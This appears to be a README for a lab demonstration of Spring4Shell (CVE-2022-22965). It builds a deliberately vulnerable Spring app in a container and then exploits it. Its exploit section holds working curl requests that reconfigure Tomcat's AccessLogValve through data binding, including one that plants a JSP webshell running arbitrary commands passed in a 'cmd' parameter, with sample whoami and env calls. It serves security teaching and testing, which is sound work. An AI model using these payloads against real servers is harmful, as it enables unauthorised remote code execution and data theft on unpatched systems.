# Spring4Shell (CVE-2022-22965) Demo App and an exploit
Demonstrates the CVE-2022-22965 vulnerability in Spring Framework data binding that allows RCE via Tomcat's AccessLogValve.

## Requirements:
- JDK 11+ (JDK 9 min. vulnerable version)
- Maven
- Docker or Podman
- Python >=3.12

## The demo app

```
cd test-app 
mvn clean compile

run the app locally  // not vulnerable
mvn spring-boot:run 
```

Access the web app via: http://localhost:8080/greeting

Build the `war` for vulnerable deployment
```
mvn clean package -DskipTests

// for macos + podman users
podman machine init
podman machine start

podman build -t test-app .
podman run -d --name test-app -p 8080:8080 test-app
```

Access the containerized  (vulnerable) app via http://localhost:8080/spring4shell-demo/greeting

### Troubleshooting the demo app
```
podman logs test-app
jar tf target/spring4shell-demo.war | head -20
```

## Exploit
The first attempt
```
curl -X POST \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=hello security' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/app' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=test' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
http://localhost:8080/spring4shell-demo/greeting
```


"fileDateFormat	
Allows a customized timestamp in the access log file name. The file is rotated whenever the formatted timestamp changes. The default value is .yyyy-MM-dd. If you wish to rotate every hour, then set this value to .yyyy-MM-dd.HH. The date format will always be localized using the locale en_US."

Reset the class to rerun the exploit
```
curl -X POST \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
http://localhost:8080/spring4shell-demo/greeting
```

Inject a webshell
```
bash
curl -X POST \
  -H "pre:<%" \
  -H "post:%>" \
  -H "colon:;" \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}i java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()%{colon}i int a = -1%{colon}i byte[] b = new byte[2048]%{colon}i while((a=in.read(b))!=-1){ out.println(new String(b))%{colon}i } %{post}i' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/app' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
http://localhost:8080/spring4shell-demo/greeting


Verify if the Webshell was injected
```
podman exec test-app ls -la /usr/local/tomcat/webapps/app/
podman exec test-app cat /usr/local/tomcat/webapps/app/rce.jsp
```


Example commands
http://localhost:8080/app/rce_.jsp?cmd=whoami
http://localhost:8080/app/rce_.jsp?cmd=env


## References:
Tomcat AccessLogValve: https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Log_Valve/Attributes
